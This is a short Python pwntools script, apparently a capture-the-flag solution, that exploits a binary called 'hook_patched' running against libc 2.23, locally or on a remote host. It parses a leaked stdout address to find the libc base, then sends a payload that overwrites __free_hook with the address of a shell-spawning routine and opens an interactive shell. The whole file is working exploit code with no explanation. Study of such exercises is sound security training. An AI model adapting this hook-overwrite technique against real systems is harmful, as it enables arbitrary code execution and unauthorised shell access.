#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('hook_patched')
libc = ELF("./libc-2.23.so")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()


def solve():

    io.recvuntil(b"stdout: ")
    stdout = int(io.recvline().strip(), 16)
    libc.address = stdout - libc.sym["_IO_2_1_stdout_"]
    info("stdout: %#x", stdout)
    info("libc base: %#x", libc.address)

    io.recvuntil(b"Size")
    io.sendline(b"100")
    io.recvuntil(b"Data:")

    call_sh = 0x400a11
    arb_write_payload = p64(libc.sym['__free_hook']) + p64(call_sh)
    io.sendline(arb_write_payload)


    io.interactive()


def main():
    
    init()
    solve()



if __name__ == '__main__':
    main()

